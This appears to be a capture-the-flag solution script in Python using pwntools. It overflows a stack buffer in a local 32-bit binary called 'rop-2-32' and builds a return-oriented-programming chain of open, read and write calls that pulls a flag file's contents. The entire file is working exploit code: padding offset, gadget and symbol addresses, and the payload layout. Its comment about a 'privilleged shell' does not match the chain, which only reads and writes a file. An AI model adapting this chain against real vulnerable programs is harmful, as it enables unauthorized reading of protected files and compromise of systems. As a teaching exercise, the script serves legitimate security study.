from pwn import *

# This code requires a symbolic link from open to flag to work

GARB = 'bbbb'

# Addresses needed for the attack
pop_pop_ret_addr = 0x0804868a # From ROPgadget --binary ./rop-2-32
pop_pop_pop_ret_addr = 0x08048689 # From ROPgadget --binary ./rop-2-32
open_addr = ELF('./rop-2-32').symbols['open']
read_addr = ELF('./rop-2-32').symbols['read']
write_addr = ELF('./rop-2-32').symbols['write']
open_string_addr = 0x804829d # Address of 'open' in the program code
ans_addr = 0xffa6ac10 # Address of the answer

# Launch processs and send rop chain
p = process('./rop-2-32')

# [0x88][ebp][ret1(open)][ret2(pop/pop/ret)][arg1(open_string)][arg2(0)]
inp = 'a' * 0x88 + GARB + p32(open_addr) + p32(pop_pop_ret_addr) + p32(open_string_addr) + p32(0)

# [ret3(read)][ret4(pop/pop/pop/ret)][arg1(3)][arg2(ans)][arg3(100)]
inp = inp + p32(read_addr) + p32(pop_pop_pop_ret_addr) + p32(3) + p32(ans_addr) + p32(100)

# [ret5(write)][garb][arg1(1)][arg2(ans)][arg3(100)]
inp = inp + p32(write_addr) + GARB + p32(1) + p32(ans_addr) + p32(100)

# send attack
p.send(inp)

# Use privilleged shell to get the flag
p.interactive()
